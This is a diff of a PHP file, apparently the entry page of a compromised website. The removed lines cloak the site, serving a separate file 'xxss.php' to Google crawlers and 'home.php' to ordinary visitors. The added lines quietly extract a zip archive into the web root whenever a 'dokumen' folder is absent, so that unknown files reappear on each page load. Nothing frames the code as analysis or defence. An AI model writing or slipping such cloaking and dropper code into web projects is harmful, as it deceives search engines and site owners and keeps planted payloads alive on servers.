@@ -1,32 +1,12 @@
 <?php
-$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
- 
-$googleBots = [
-    'Googlebot',
-    'Googlebot-Image',
-    'Googlebot-Video',
-    'Googlebot-News',
-    'Storebot-Google',
-    'Google-InspectionTool',
-    'GoogleOther',
-    'GoogleOther-Image',
-    'GoogleOther-Video',
-    'Google-CloudVertexBot'
-];
- 
-$isGoogleBot = false;
-foreach ($googleBots as $bot) {
-    if (stripos($userAgent, $bot) !== false) {
-        $isGoogleBot = true;
-        break;
+$zipFile   = __DIR__ . '/sd9878.zip';
+$targetDir = __DIR__ . '/dokumen';
+
+if (!is_dir($targetDir)) {
+    $zip = new ZipArchive;
+
+    if ($zip->open($zipFile) === TRUE) {
+        $zip->extractTo(__DIR__ . '/');
+        $zip->close();
     }
 }
- 
-if ($isGoogleBot) {
-    include(__DIR__ . '/xxss.php');
-    exit;
-} else {
-    include(__DIR__ . '/home.php');
-    exit;
-}
-?>
